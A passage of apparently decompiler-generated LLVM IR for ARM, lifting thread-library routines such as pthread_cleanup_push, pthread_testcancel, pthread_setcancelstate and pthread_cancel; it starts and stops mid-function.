  store i32 %v0_e288, i32* %r5.global-to-local, align 4
  %v2_e2b02 = icmp eq i32 %v3_e28c, 0
  br i1 %v2_e2b02, label %dec_label_pc_e2b8, label %dec_label_pc_e298

dec_label_pc_e298:                                ; preds = %entry, %dec_label_pc_e2a0
  %v0_e2a0 = phi i32 [ %v3_e2ac, %dec_label_pc_e2a0 ], [ %v3_e28c, %entry ]
  %v1_e298 = load i32, i32* %r6.global-to-local, align 4
  %tmp = icmp ugt i32 %v0_e2a0, %v1_e298
  br i1 %tmp, label %dec_label_pc_e2a0, label %dec_label_pc_e2b8.loopexit

dec_label_pc_e2a0:                                ; preds = %dec_label_pc_e298
  %v1_e2a0 = add i32 %v0_e2a0, 4
  %v2_e2a0 = inttoptr i32 %v1_e2a0 to i32*
  %v3_e2a0 = load i32, i32* %v2_e2a0, align 4
  store i32 %v3_e2a0, i32* %r0.global-to-local, align 4
  store i32 58028, i32* @lr, align 4
  %v1_e2a8 = inttoptr i32 %v0_e2a0 to i32*
  %v2_e2a8 = load i32, i32* %v1_e2a8, align 4
  call void @__pseudo_branch(i32 %v2_e2a8)
  %v0_e2ac = load i32, i32* %r4.global-to-local, align 4
  %v1_e2ac = add i32 %v0_e2ac, 12
  %v2_e2ac = inttoptr i32 %v1_e2ac to i32*
  %v3_e2ac = load i32, i32* %v2_e2ac, align 4
  store i32 %v3_e2ac, i32* %r4.global-to-local, align 4
  %v2_e2b0 = icmp eq i32 %v3_e2ac, 0
  br i1 %v2_e2b0, label %dec_label_pc_e2b8.loopexit, label %dec_label_pc_e298

dec_label_pc_e2b8.loopexit:                       ; preds = %dec_label_pc_e298, %dec_label_pc_e2a0
  %v0_e2b8.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_e2b8

dec_label_pc_e2b8:                                ; preds = %dec_label_pc_e2b8.loopexit, %entry
  %v0_e2b8 = phi i32 [ %v0_e2b8.pre, %dec_label_pc_e2b8.loopexit ], [ %v0_e288, %entry ]
  %v1_e2b8 = add i32 %v0_e2b8, 372
  %v2_e2b8 = inttoptr i32 %v1_e2b8 to i32*
  %v3_e2b8 = load i32, i32* %v2_e2b8, align 4
  %v2_e2bc = icmp eq i32 %v3_e2b8, 0
  %v3_e2c0 = load i32, i32* %stack_var_-16, align 4
  store i32 %v3_e2c0, i32* @r4, align 4
  store i32 %v6_e280, i32* @r5, align 4
  store i32 %v9_e280, i32* @r6, align 4
  br i1 %v2_e2bc, label %bb, label %bb8

bb:                                               ; preds = %dec_label_pc_e2b8
  %v15_e2c0 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v15_e2c0

bb8:                                              ; preds = %dec_label_pc_e2b8
  store i32 %v12_e280, i32* @lr, align 4
  %v0_e2c8 = call i32 @__rpc_thread_destroy()
  store i32 %v0_e2c8, i32* %r0.global-to-local, align 4
  ret i32 %v0_e2c8

; uselistorder directives
  uselistorder i32 %v3_e2ac, { 1, 2, 0 }
  uselistorder i32 %v0_e2a0, { 2, 1, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 3, 2, 4, 0 }
  uselistorder label %dec_label_pc_e2b8.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_e298, { 1, 0 }
}

define i32 @__pthread_cleanup_push_defer() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_e2cc = load i32, i32* @r4, align 4
  store i32 %v3_e2cc, i32* %stack_var_-16, align 4
  %v0_e2d0 = load i32, i32* @r0, align 4
  store i32 %v0_e2d0, i32* %r6.global-to-local, align 4
  %v0_e2d4 = load i32, i32* @r2, align 4
  store i32 %v0_e2d4, i32* %r5.global-to-local, align 4
  %v0_e2d8 = load i32, i32* @r1, align 4
  %v0_e2dc = call i32 @_thread_self.5()
  %v1_e2e0 = inttoptr i32 %v0_e2d0 to i32*
  store i32 %v0_e2d8, i32* %v1_e2e0, align 4
  %v3_e2e0 = add i32 %v0_e2d0, 4
  %v4_e2e0 = inttoptr i32 %v3_e2e0 to i32*
  %v5_e2e0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v5_e2e0, i32* %v4_e2e0, align 4
  %v1_e2e4 = add i32 %v0_e2dc, 60
  %v2_e2e4 = inttoptr i32 %v1_e2e4 to i32*
  %v3_e2e4 = load i32, i32* %v2_e2e4, align 4
  store i32 %v3_e2e4, i32* %r2.global-to-local, align 4
  %v1_e2e8 = add i32 %v0_e2dc, 65
  %v2_e2e8 = inttoptr i32 %v1_e2e8 to i8*
  %v3_e2e8 = load i8, i8* %v2_e2e8, align 1
  %v4_e2e8 = zext i8 %v3_e2e8 to i32
  store i32 %v4_e2e8, i32* %r3.global-to-local, align 4
  %v2_e2ec = icmp eq i32 %v3_e2e4, 0
  %v1_e2f0 = load i32, i32* %r6.global-to-local, align 4
  %v2_e2f0 = add i32 %v1_e2f0, 8
  %v3_e2f0 = inttoptr i32 %v2_e2f0 to i32*
  store i32 %v4_e2e8, i32* %v3_e2f0, align 4
  %v0_e2f4 = load i32, i32* %r2.global-to-local, align 4
  %v1_e2f4 = load i32, i32* %r6.global-to-local, align 4
  %v2_e2f4 = add i32 %v1_e2f4, 12
  %v3_e2f4 = inttoptr i32 %v2_e2f4 to i32*
  store i32 %v0_e2f4, i32* %v3_e2f4, align 4
  br i1 %v2_e2ec, label %.thread, label %dec_label_pc_e2fc

dec_label_pc_e2fc:                                ; preds = %entry
  %v0_e2fc = load i32, i32* %r6.global-to-local, align 4
  %v1_e2fc = load i32, i32* %r2.global-to-local, align 4
  %v3_e2fc = icmp ult i32 %v0_e2fc, %v1_e2fc
  br i1 %v3_e2fc, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_e2fc
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_e304 = add i32 %v0_e2fc, 12
  %v4_e304 = inttoptr i32 %v3_e304 to i32*
  store i32 0, i32* %v4_e304, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_e2fc, %entry, %bb
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_e30c = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_e30c, i32* %v2_e2e4, align 4
  %v0_e310 = load i32, i32* %r3.global-to-local, align 4
  %v1_e310 = trunc i32 %v0_e310 to i8
  store i8 %v1_e310, i8* %v2_e2e8, align 1
  %v2_e314 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_e314, i32* @r4, align 4
  ret i32 %v0_e2dc

; uselistorder directives
  uselistorder i32 %v0_e2dc, { 0, 2, 1 }
  uselistorder i32 %v0_e2d0, { 1, 0, 2 }
  uselistorder label %.thread, { 2, 0, 1 }
}

define i32 @_pthread_cleanup_pop(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-8 = alloca i32, align 4
  %v2_e318 = icmp eq i32 %arg2, 0
  %v3_e31c = load i32, i32* @r4, align 4
  store i32 %v3_e31c, i32* %stack_var_-8, align 4
  store i32 %tmp, i32* %r4.global-to-local, align 4
  br i1 %v2_e318, label %.thread, label %bb

bb:                                               ; preds = %entry
  %v4_e32c = call i32 @unknown_0()
  br label %.thread

.thread:                                          ; preds = %entry, %bb
  %v0_e330 = call i32 @_thread_self.5()
  %v0_e334 = load i32, i32* %r4.global-to-local, align 4
  %v1_e334 = add i32 %v0_e334, 12
  %v2_e334 = inttoptr i32 %v1_e334 to i32*
  %v3_e334 = load i32, i32* %v2_e334, align 4
  %v2_e338 = add i32 %v0_e330, 60
  %v3_e338 = inttoptr i32 %v2_e338 to i32*
  store i32 %v3_e334, i32* %v3_e338, align 4
  %v2_e33c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_e33c, i32* @r4, align 4
  ret i32 %v0_e330

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @_pthread_cleanup_push(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* @r2, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v3_e340 = load i32, i32* @r4, align 4
  store i32 %v3_e340, i32* %stack_var_-16, align 4
  store i32 %tmp, i32* %r6.global-to-local, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  %v0_e350 = call i32 @_thread_self.5()
  %v1_e354 = add i32 %v0_e350, 60
  %v2_e354 = inttoptr i32 %v1_e354 to i32*
  %v3_e354 = load i32, i32* %v2_e354, align 4
  store i32 %v3_e354, i32* %r3.global-to-local, align 4
  %v2_e358 = icmp eq i32 %v3_e354, 0
  %v0_e35c = load i32, i32* %r6.global-to-local, align 4
  %v1_e35c = inttoptr i32 %v0_e35c to i32*
  %v2_e35c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v2_e35c, i32* %v1_e35c, align 4
  %v3_e35c = add i32 %v0_e35c, 4
  %v4_e35c = inttoptr i32 %v3_e35c to i32*
  %v5_e35c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v5_e35c, i32* %v4_e35c, align 4
  %v0_e360 = load i32, i32* %r3.global-to-local, align 4
  %v1_e360 = load i32, i32* %r6.global-to-local, align 4
  %v2_e360 = add i32 %v1_e360, 12
  %v3_e360 = inttoptr i32 %v2_e360 to i32*
  store i32 %v0_e360, i32* %v3_e360, align 4
  br i1 %v2_e358, label %.thread, label %dec_label_pc_e368

dec_label_pc_e368:                                ; preds = %entry
  %v0_e368 = load i32, i32* %r6.global-to-local, align 4
  %v1_e368 = load i32, i32* %r3.global-to-local, align 4
  %v3_e368 = icmp ult i32 %v0_e368, %v1_e368
  br i1 %v3_e368, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_e368
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_e370 = add i32 %v0_e368, 12
  %v4_e370 = inttoptr i32 %v3_e370 to i32*
  store i32 0, i32* %v4_e370, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_e368, %entry, %bb
  %v0_e374 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_e374, i32* %v2_e354, align 4
  %v2_e378 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_e378, i32* @r4, align 4
  ret i32 %v0_e350

; uselistorder directives
  uselistorder label %.thread, { 2, 0, 1 }
}

define i32 @__pthread_cleanup_pop_restore() local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_e37c = load i32, i32* @r4, align 4
  store i32 %v3_e37c, i32* %stack_var_-16, align 4
  %v6_e37c = load i32, i32* @r5, align 4
  %v13_e37c = ptrtoint i32* %stack_var_-16 to i32
  %v0_e380 = load i32, i32* @r1, align 4
  %v0_e384 = load i32, i32* @r0, align 4
  store i32 %v0_e384, i32* %r5.global-to-local, align 4
  %v0_e388 = call i32 @_thread_self.5()
  store i32 %v0_e388, i32* %r0.global-to-local, align 4
  %v2_e38c = icmp eq i32 %v0_e380, 0
  store i1 %v2_e38c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_e388, i32* %r6.global-to-local, align 4
  br i1 %v2_e38c, label %.thread1, label %bb

bb:                                               ; preds = %entry
  %v1_e394 = load i32, i32* %r5.global-to-local, align 4
  %v2_e394 = add i32 %v1_e394, 4
  %v3_e394 = inttoptr i32 %v2_e394 to i32*
  %v4_e394 = load i32, i32* %v3_e394, align 4
  store i32 %v4_e394, i32* %r0.global-to-local, align 4
  store i32 58272, i32* @lr, align 4
  %v4_e39c = call i32 @unknown_0()
  store i32 %v4_e39c, i32* %r0.global-to-local, align 4
  %v0_e3a0.pre = load i32, i32* %r6.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %entry, %bb
  %v1_e3b0 = phi i32 [ %v0_e388, %entry ], [ %v0_e3a0.pre, %bb ]
  %v1_e3a0 = add i32 %v1_e3b0, 66
  %v2_e3a0 = inttoptr i32 %v1_e3a0 to i8*
  %v3_e3a0 = load i8, i8* %v2_e3a0, align 1
  %v0_e3a4 = load i32, i32* %r5.global-to-local, align 4
  %v1_e3a4 = add i32 %v0_e3a4, 8
  store i32 %v1_e3a4, i32* %r1.global-to-local, align 4
  %v1_e3a8 = inttoptr i32 %v1_e3a4 to i32*
  %v2_e3a8 = load i32, i32* %v1_e3a8, align 4
  store i32 %v2_e3a8, i32* %r1.global-to-local, align 4
  %v3_e3a8 = add i32 %v0_e3a4, 12
  %v4_e3a8 = inttoptr i32 %v3_e3a8 to i32*
  %v5_e3a8 = load i32, i32* %v4_e3a8, align 4
  %v2_e3ac = icmp eq i8 %v3_e3a0, 0
  store i1 %v2_e3ac, i1* %cpsr_z.global-to-local, align 1
  %v2_e3b0 = add i32 %v1_e3b0, 60
  %v3_e3b0 = inttoptr i32 %v2_e3b0 to i32*
  store i32 %v5_e3a8, i32* %v3_e3b0, align 4
  %v0_e3b4 = load i32, i32* %r1.global-to-local, align 4
  %v1_e3b4 = trunc i32 %v0_e3b4 to i8
  %v2_e3b4 = load i32, i32* %r6.global-to-local, align 4
  %v3_e3b4 = add i32 %v2_e3b4, 65
  %v4_e3b4 = inttoptr i32 %v3_e3b4 to i8*
  store i8 %v1_e3b4, i8* %v4_e3b4, align 1
  %v0_e3b8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_e3b8, label %bb7, label %bb8

bb7:                                              ; preds = %.thread1
  %v3_e3b8 = load i32, i32* %stack_var_-16, align 4
  store i32 %v3_e3b8, i32* @r4, align 4
  store i32 %v6_e37c, i32* @r5, align 4
  %v15_e3b8 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v15_e3b8

bb8:                                              ; preds = %.thread1
  %v0_e3bc = load i32, i32* %r6.global-to-local, align 4
  %v1_e3bc = add i32 %v0_e3bc, 65
  %v2_e3bc = inttoptr i32 %v1_e3bc to i8*
  %v3_e3bc = load i8, i8* %v2_e3bc, align 1
  %v4_e3bc = zext i8 %v3_e3bc to i32
  %v1_e3c0 = add i32 %v0_e3bc, 64
  %v2_e3c0 = inttoptr i32 %v1_e3c0 to i8*
  %v3_e3c0 = load i8, i8* %v2_e3c0, align 1
  %v4_e3c0 = zext i8 %v3_e3c0 to i32
  %v4_e3c4 = mul nuw nsw i32 %v4_e3bc, 256
  %v5_e3c4 = or i32 %v4_e3c0, %v4_e3c4
  %v7_e3c8 = icmp eq i32 %v5_e3c4, 256
  store i1 %v7_e3c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e3c8, label %bb10, label %bb9

bb9:                                              ; preds = %bb8
  %v3_e3cc = load i32, i32* %stack_var_-16, align 4
  store i32 %v3_e3cc, i32* @r4, align 4
  store i32 %v6_e37c, i32* @r5, align 4
  %v15_e3cc = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v15_e3cc

bb10:                                             ; preds = %bb8
  store i32 -1, i32* %r0.global-to-local, align 4
  store i32 %v13_e37c, i32* %r1.global-to-local, align 4
  %v2_e3d8 = call i32 @__pthread_do_exit(i32 -1, i32 %v13_e37c)
  store i32 %v2_e3d8, i32* %r0.global-to-local, align 4
  ret i32 %v2_e3d8

; uselistorder directives
  uselistorder i32 %v13_e37c, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 0, 1, 3, 2 }
  uselistorder i32* %r0.global-to-local, { 3, 0, 4, 5, 1, 2, 6 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @pthread_testcancel() local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_e3dc = load i32, i32* @lr, align 4
  store i32 %v0_e3dc, i32* %stack_var_-4, align 4
  %v6_e3dc = ptrtoint i32* %stack_var_-4 to i32
  %v0_e3e0 = call i32 @_thread_self.5()
  %v1_e3e4 = add i32 %v0_e3e0, 66
  %v2_e3e4 = inttoptr i32 %v1_e3e4 to i8*
  %v3_e3e4 = load i8, i8* %v2_e3e4, align 1
  %v2_e3e8 = icmp eq i8 %v3_e3e4, 0
  br i1 %v2_e3e8, label %bb, label %bb2

bb:                                               ; preds = %entry
  ret i32 %v0_e3e0

bb2:                                              ; preds = %entry
  %v1_e3f0 = add i32 %v0_e3e0, 64
  %v2_e3f0 = inttoptr i32 %v1_e3f0 to i8*
  %v3_e3f0 = load i8, i8* %v2_e3f0, align 1
  %v2_e3f4 = icmp eq i8 %v3_e3f0, 0
  br i1 %v2_e3f4, label %bb4, label %bb3

bb3:                                              ; preds = %bb2
  ret i32 %v0_e3e0

bb4:                                              ; preds = %bb2
  %v2_e404 = call i32 @__pthread_do_exit(i32 -1, i32 %v6_e3dc)
  ret i32 %v2_e404

; uselistorder directives
  uselistorder i32 %v0_e3e0, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @__GI_pthread_setcanceltype(i8 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %tmp = sext i8 %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %v2_e408 = icmp ne i8 %arg1, 0
  %v7_e408 = icmp eq i8 %arg1, 1
  store i1 %v7_e408, i1* %cpsr_z.global-to-local, align 1
  %v3_e40c = load i32, i32* @r4, align 4
  store i32 %v3_e40c, i32* %stack_var_-12, align 4
  store i32 %tmp, i32* %r5.global-to-local, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %v2_e418 = xor i1 %v7_e408, true
  %v3_e418 = and i1 %v2_e408, %v2_e418
  br i1 %v3_e418, label %bb, label %bb12

bb:                                               ; preds = %entry
  store i32 %v3_e40c, i32* @r4, align 4
  ret i32 22

bb12:                                             ; preds = %entry
  %v0_e420 = call i32 @_thread_self.5()
  %v0_e424 = load i32, i32* %r4.global-to-local, align 4
  %v2_e424 = icmp eq i32 %v0_e424, 0
  store i1 %v2_e424, i1* %cpsr_z.global-to-local, align 1
  %.pre = add i32 %v0_e420, 65
  %.pre4 = inttoptr i32 %.pre to i8*
  br i1 %v2_e424, label %.thread, label %bb13

bb13:                                             ; preds = %bb12
  %v4_e428 = load i8, i8* %.pre4, align 1
  %v5_e428 = zext i8 %v4_e428 to i32
  %v3_e42c = inttoptr i32 %v0_e424 to i32*
  store i32 %v5_e428, i32* %v3_e42c, align 4
  br label %.thread

.thread:                                          ; preds = %bb12, %bb13
  %v1_e430 = add i32 %v0_e420, 66
  %v2_e430 = inttoptr i32 %v1_e430 to i8*
  %v3_e430 = load i8, i8* %v2_e430, align 1
  %v2_e434 = icmp eq i8 %v3_e430, 0
  store i1 %v2_e434, i1* %cpsr_z.global-to-local, align 1
  %v0_e438 = load i32, i32* %r5.global-to-local, align 4
  %v1_e438 = trunc i32 %v0_e438 to i8
  store i8 %v1_e438, i8* %.pre4, align 1
  %v0_e43c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_e43c, label %dec_label_pc_e45c, label %dec_label_pc_e440

dec_label_pc_e440:                                ; preds = %.thread
  %v4_e440 = urem i32 %v0_e438, 256
  %v1_e444 = add i32 %v0_e420, 64
  %v2_e444 = inttoptr i32 %v1_e444 to i8*
  %v3_e444 = load i8, i8* %v2_e444, align 1
  %v4_e444 = zext i8 %v3_e444 to i32
  %v4_e448 = mul nuw nsw i32 %v4_e440, 256
  %v5_e448 = or i32 %v4_e444, %v4_e448
  %v7_e44c = icmp eq i32 %v5_e448, 256
  store i1 %v7_e44c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e44c, label %bb14, label %.thread1

bb14:                                             ; preds = %dec_label_pc_e440
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_e440, %bb14
  store i32 58460, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v7_e44c, i32 ptrtoint (i32* @global_var_ecfc.435 to i32))
  br label %dec_label_pc_e45c

dec_label_pc_e45c:                                ; preds = %.thread, %.thread1
  %v2_e460 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_e460, i32* @r4, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_e420, { 1, 2, 0 }
  uselistorder i1 %v7_e408, { 1, 0 }
  uselistorder label %dec_label_pc_e45c, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @pthread_setcancelstate(i8 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %tmp = sext i8 %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %v2_e464 = icmp ne i8 %arg1, 0
  %v7_e464 = icmp eq i8 %arg1, 1
  store i1 %v7_e464, i1* %cpsr_z.global-to-local, align 1
  %v3_e468 = load i32, i32* @r4, align 4
  store i32 %v3_e468, i32* %stack_var_-12, align 4
  store i32 %tmp, i32* %r5.global-to-local, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %v2_e474 = xor i1 %v7_e464, true
  %v3_e474 = and i1 %v2_e464, %v2_e474
  br i1 %v3_e474, label %bb, label %bb12

bb:                                               ; preds = %entry
  store i32 %v3_e468, i32* %r4.global-to-local, align 4
  ret i32 22

bb12:                                             ; preds = %entry
  %v0_e47c = call i32 @_thread_self.5()
  %v0_e480 = load i32, i32* %r4.global-to-local, align 4
  %v2_e480 = icmp eq i32 %v0_e480, 0
  store i1 %v2_e480, i1* %cpsr_z.global-to-local, align 1
  %.pre = add i32 %v0_e47c, 64
  %.pre4 = inttoptr i32 %.pre to i8*
  br i1 %v2_e480, label %.thread, label %bb13

bb13:                                             ; preds = %bb12
  %v4_e484 = load i8, i8* %.pre4, align 1
  %v5_e484 = zext i8 %v4_e484 to i32
  %v3_e488 = inttoptr i32 %v0_e480 to i32*
  store i32 %v5_e484, i32* %v3_e488, align 4
  br label %.thread

.thread:                                          ; preds = %bb12, %bb13
  %v1_e48c = add i32 %v0_e47c, 66
  %v2_e48c = inttoptr i32 %v1_e48c to i8*
  %v3_e48c = load i8, i8* %v2_e48c, align 1
  %v2_e490 = icmp eq i8 %v3_e48c, 0
  store i1 %v2_e490, i1* %cpsr_z.global-to-local, align 1
  %v0_e494 = load i32, i32* %r5.global-to-local, align 4
  %v1_e494 = trunc i32 %v0_e494 to i8
  store i8 %v1_e494, i8* %.pre4, align 1
  %v0_e498 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_e498, label %dec_label_pc_e4b8, label %dec_label_pc_e49c

dec_label_pc_e49c:                                ; preds = %.thread
  %v1_e49c = add i32 %v0_e47c, 65
  %v2_e49c = inttoptr i32 %v1_e49c to i8*
  %v3_e49c = load i8, i8* %v2_e49c, align 1
  %v4_e49c = zext i8 %v3_e49c to i32
  %v3_e4a0 = load i8, i8* %.pre4, align 1
  %v4_e4a0 = zext i8 %v3_e4a0 to i32
  %v4_e4a4 = mul nuw nsw i32 %v4_e49c, 256
  %v5_e4a4 = or i32 %v4_e4a0, %v4_e4a4
  %v7_e4a8 = icmp eq i32 %v5_e4a4, 256
  store i1 %v7_e4a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e4a8, label %bb14, label %.thread1

bb14:                                             ; preds = %dec_label_pc_e49c
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_e49c, %bb14
  call void @__pseudo_cond_branch(i1 %v7_e4a8, i32 ptrtoint (i32* @global_var_ecfc.435 to i32))
  br label %dec_label_pc_e4b8

dec_label_pc_e4b8:                                ; preds = %.thread, %.thread1
  %v2_e4bc = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_e4bc, i32* %r4.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_e47c, { 2, 1, 0 }
  uselistorder i1 %v7_e464, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32 ()* @_thread_self.5, { 5, 0, 2, 4, 7, 6, 3, 1 }
  uselistorder label %dec_label_pc_e4b8, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @pthread_cancel(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v3_e4c8 = urem i32 %arg1, 1024
  %v4_e4d0 = mul nuw nsw i32 %v3_e4c8, 16
  %v5_e4d0 = add i32 %v4_e4d0, ptrtoint (i32* @global_var_270a0.207 to i32)
  store i32 %v5_e4d0, i32* %r6.global-to-local, align 4
  store i32 %arg1, i32* %r5.global-to-local, align 4
  store i32 %v5_e4d0, i32* %r0.global-to-local, align 4
  %v2_e4e0 = call i32 @__pthread_lock(i32 %v5_e4d0, i32 0)
  store i32 %v2_e4e0, i32* %r0.global-to-local, align 4
  %v1_e4e4 = add i32 %v4_e4d0, add (i32 ptrtoint (i32* @global_var_270a0.207 to i32), i32 8)
  %v2_e4e4 = inttoptr i32 %v1_e4e4 to i32*
  %v3_e4e4 = load i32, i32* %v2_e4e4, align 4
  store i32 %v3_e4e4, i32* @r4, align 4
  %v2_e4e8 = icmp eq i32 %v3_e4e4, 0
  store i1 %v2_e4e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e4e8, label %dec_label_pc_e504, label %dec_label_pc_e4f0

dec_label_pc_e4f0:                                ; preds = %entry
  %v1_e4f0 = add i32 %v3_e4e4, 16
  %v2_e4f0 = inttoptr i32 %v1_e4f0 to i32*
  %v3_e4f0 = load i32, i32* %v2_e4f0, align 4
  %v1_e4f4 = load i32, i32* %r5.global-to-local, align 4
  %v2_e4f4 = sub i32 %v3_e4f0, %v1_e4f4
  store i32 %v2_e4f4, i32* %r5.global-to-local, align 4
  %v9_e4f4 = icmp eq i32 %v3_e4f0, %v1_e4f4
  store i1 %v9_e4f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_e4f4, label %bb, label %.thread

.thread:                                          ; preds = %dec_label_pc_e4f0
  store i32 1, i32* %r5.global-to-local, align 4
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_e504

bb:                                               ; preds = %dec_label_pc_e4f0
  %v2_e4fc = icmp eq i32 %v2_e4f4, 0
  store i1 %v2_e4fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e4fc, label %dec_label_pc_e514, label %dec_label_pc_e504

dec_label_pc_e504:                                ; preds = %.thread, %bb, %entry
  store i32 %v5_e4d0, i32* %r0.global-to-local, align 4
  %v1_e508 = call i32 @__pthread_unlock(i32 %v5_e4d0)
  store i32 3, i32* %r0.global-to-local, align 4
  ret i32 3

dec_label_pc_e514:                                ; preds = %bb
  %v1_e514 = add i32 %v3_e4e4, 66
  %v2_e514 = inttoptr i32 %v1_e514 to i8*
  %v3_e514 = load i8, i8* %v2_e514, align 1
  %v4_e514 = zext i8 %v3_e514 to i32
  %v1_e518 = add i32 %v3_e4e4, 64
  %v2_e518 = inttoptr i32 %v1_e518 to i8*
  %v3_e518 = load i8, i8* %v2_e518, align 1
  %v2_e51c = icmp eq i8 %v3_e514, 0
  store i1 %v2_e51c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e51c, label %bb12, label %bb11

bb11:                                             ; preds = %dec_label_pc_e514
  br label %bb12

bb12:                                             ; preds = %dec_label_pc_e514, %bb11
  %v1_e528 = phi i32 [ %v4_e514, %dec_label_pc_e514 ], [ 1, %bb11 ]
  %v7_e524 = icmp eq i8 %v3_e518, 1
  store i1 %v7_e524, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e524, label %bb13, label %bb14

bb13:                                             ; preds = %bb12
  br label %bb14

bb14:                                             ; preds = %bb12, %bb13
  %v0_e52c = phi i32 [ %v1_e528, %bb12 ], [ 1, %bb13 ]
  %v2_e52c = icmp eq i32 %v0_e52c, 0
  store i1 %v2_e52c, i1* %cpsr_z.global-to-local, align 1
  store i8 1, i8* %v2_e514, align 1
  %v0_e538 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_e538, label %dec_label_pc_e54c, label %dec_label_pc_e53c

dec_label_pc_e53c:                                ; preds = %bb14
  %v0_e53c = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_e53c, i32* %r0.global-to-local, align 4
  %v1_e540 = call i32 @__pthread_unlock(i32 %v0_e53c)
  %v0_e544 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_e544, i32* %r0.global-to-local, align 4
  ret i32 %v0_e544

dec_label_pc_e54c:                                ; preds = %bb14
  %v0_e54c = load i32, i32* @r4, align 4
  %v1_e54c = add i32 %v0_e54c, 444
  %v2_e54c = inttoptr i32 %v1_e54c to i32*
  %v3_e54c = load i32, i32* %v2_e54c, align 4
  %v2_e550 = icmp eq i32 %v3_e54c, 0
  store i1 %v2_e550, i1* %cpsr_z.global-to-local, align 1
  %v1_e554 = add i32 %v0_e54c, 20
  %v2_e554 = inttoptr i32 %v1_e554 to i32*
  %v3_e554 = load i32, i32* %v2_e554, align 4
